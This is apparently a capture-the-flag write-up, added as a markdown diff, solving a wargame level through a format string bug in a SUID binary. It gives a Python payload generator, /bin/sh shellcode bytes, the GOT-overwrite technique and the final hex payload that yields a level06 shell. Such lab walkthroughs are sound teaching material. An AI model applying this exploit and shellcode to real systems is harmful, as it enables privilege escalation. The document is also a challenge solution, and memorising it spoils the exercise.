@@ -1,0 +1,194 @@
+# Level05 Walkthrough
+
+## Enumeration
+
+After connecting to the machine through SSH, I accessed the `level05` account and started enumerating the files available in the home directory.
+
+A binary named `level05` immediately stood out because it had the SUID bit set:
+
+```bash
+-rwsr-s---+ 1 level06 users 5176 Sep 10 2016 level05
+```
+
+Since the binary runs with the privileges of `level06`, exploiting it could potentially grant access to the next level.
+
+---
+
+## Binary Analysis
+
+After reversing the binary, I found the following logic:
+
+```c
+fgets(buffer, 100, stdin);
+
+for (i = 0; i < strlen(buffer); ++i)
+{
+    if (buffer[i] > 64 && buffer[i] <= 90)
+        buffer[i] ^= 32;
+}
+
+printf(buffer);
+exit(0);
+```
+
+The program reads user input, converts all uppercase characters to lowercase, and then passes the resulting buffer directly to `printf()`.
+
+The vulnerable line is:
+
+```c
+printf(buffer);
+```
+
+Because user input is used as the format string, the binary is vulnerable to a **format string vulnerability**.
+
+---
+
+## Exploitation Strategy
+
+The presence of a format string vulnerability allows arbitrary memory reads and writes through format specifiers such as `%x` and `%n`.
+
+My objective was to gain code execution by overwriting a function pointer in the Global Offset Table (GOT).
+
+Since the program calls `exit()` immediately after `printf()`, the `exit` GOT entry was an ideal target. By overwriting the address stored in the GOT for `exit`, I could redirect execution to shellcode placed in memory.
+
+The exploit therefore consisted of:
+
+1. Placing shellcode in the process memory.
+2. Using the format string vulnerability to overwrite the GOT entry of `exit`.
+3. Redirecting execution to the shellcode.
+4. Letting the program call `exit()`, which would instead jump to the shellcode and spawn a shell with `level06` privileges.
+
+---
+
+## Payload Generator Analysis
+
+Rather than building the exploit manually, I used a small Python script to generate the final payload automatically:
+
+```python
+import struct
+
+SHELLCODE = b"\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x6A\x0B\x58\x89\xE3\x31\xC9\x31\xD2\xCD\x80"
+
+EXIT_PLT = 0x80497e0
+SHELLCODE_ADDR = 0xffffd6e4
+
+least_addr = struct.pack('I', EXIT_PLT)
+most_addr = struct.pack('I', EXIT_PLT + 2)
+
+exploit = ""
+exploit += least_addr
+exploit += most_addr
+
+exploit += b"%10$55004x"
+exploit += b"%10$n "
+exploit += b"%10$76058x"
+exploit += b"%11$n "
+
+exploit += '\x00'
+
+exploit += b'\x90'*(99 - len(exploit)-len(SHELLCODE))
+
+exploit += SHELLCODE
+
+print exploit
+```
+
+### Address Placement
+
+The first four bytes of the payload contain the address of the `exit` GOT entry:
+
+```python
+least_addr = struct.pack('I', EXIT_PLT)
+```
+
+The next four bytes contain the address two bytes later:
+
+```python
+most_addr = struct.pack('I', EXIT_PLT + 2)
+```
+
+This allows the format string vulnerability to perform two separate `%n` writes, one for the lower 16 bits and one for the upper 16 bits of the target address.
+
+### Format String Writes
+
+The format string portion of the payload is responsible for overwriting the `exit` GOT entry:
+
+```python
+exploit += b"%10$55004x"
+exploit += b"%10$n "
+exploit += b"%10$76058x"
+exploit += b"%11$n "
+```
+
+The large field widths force `printf()` to print a specific number of characters before each `%n` operation. Since `%n` writes the number of characters printed so far, this technique makes it possible to write controlled values into memory.
+
+Using two writes avoids having to print an impractically large number of characters in a single operation and allows the complete shellcode address to be reconstructed in the GOT entry.
+
+### NOP Sled and Shellcode
+
+After the format string, a NOP sled is added:
+
+```python
+exploit += b'\x90'*(99 - len(exploit)-len(SHELLCODE))
+```
+
+The sled fills the remaining space in the input buffer and increases reliability by providing a larger landing area for execution.
+
+The final part of the payload is Linux x86 shellcode:
+
+```python
+exploit += SHELLCODE
+```
+
+This shellcode executes `/bin/sh`, providing a shell when execution is redirected to it.
+
+### Final Layout
+
+The generated payload has the following structure:
+
+```text
+[exit GOT]
+[exit GOT + 2]
+[format string writes]
+[NULL byte]
+[NOP sled]
+[/bin/sh shellcode]
+```
+
+When `printf()` processes the malicious format string, the `exit` GOT entry is overwritten with the address of the shellcode. The subsequent call to `exit()` then transfers execution to the injected shellcode, resulting in a shell running with the privileges of `level06`.
+
+---
+
+## Payload
+
+The payload used was:
+
+```text
+e0970408e297040825313024353530303478253130246e20253130243736
+30353878253131246e200090909090909090909090909090909090909090
+909090909090909090909090909090909090682f736800682f62696e6a0b
+5889e331c931d2cd800a
+```
+
+The payload contains:
+
+* The target GOT addresses.
+* Format string directives used to perform the writes.
+* A NOP sled.
+* Linux x86 shellcode that executes `/bin/sh`.
+
+---
+
+## Result
+
+After sending the payload to the vulnerable binary, the format string successfully overwrote the `exit` GOT entry.
+
+When the program reached:
+
+```c
+exit(0);
+```
+
+execution was redirected to the injected shellcode instead of the real `exit()` function.
+
+A shell was spawned with the effective privileges of `level06`, allowing access to the next level.
